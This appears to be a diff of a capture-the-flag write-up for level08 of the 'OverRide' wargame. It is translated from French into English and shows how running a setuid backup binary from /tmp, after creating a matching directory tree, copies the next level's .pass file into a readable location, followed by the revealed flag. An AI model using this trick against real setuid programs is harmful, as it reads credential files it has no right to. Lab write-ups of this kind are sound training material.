@@ -1,18 +1,25 @@
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
-level08@OverRide:~$ file level08 
-level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped
+# level08
 
-Ce binaire prend un argument en parametre. Le parametre de ce binaire sera un fichier qui sera ouvert puis lu, son contenu sera copier dans ".backups/<argv[1]>" ou le fichier sera creer, attention, si le fichier existe deja, le open renverra une erreur.
+The programs takes a file as parameter.
 
-Notre but et d'ouvrir le fichier .pass du level09.
+By looking at the code, we can see that it copy the file passed in params to `./backups/argv[1]`. If the file already exists, an error is thrown.
 
-Nous nous placons donc dans /tmp qui est un repertoire ou nous avons les droits d'ecriture.
-Afins que la fonction open() puisse creer le fichier et ne renvoit pas d'erreur, nous creons le path comme ceci:
-mkdir -p backups//home/users/level09
+The goal here is to open the `.pass` of the level09, but obviously we haven't the rights to write in the current directory:
 
+```bash
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+level08@OverRide:~$ mkdir -p backups/home/users/level09
+mkdir: cannot create directory `backups/home': Permission denied
+```
+
+We move in `/tmp` and create the complete patht to avoid any errors:
+
+```bash
 level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
-
-Le flag du level09 a donc etait copier dans le repertoire suivant:
+ERROR: Failed to open ./backups//home/users/level09/.pass
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
 level08@OverRide:/tmp$ cat ./backups//home/users/level09/.pass
-
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
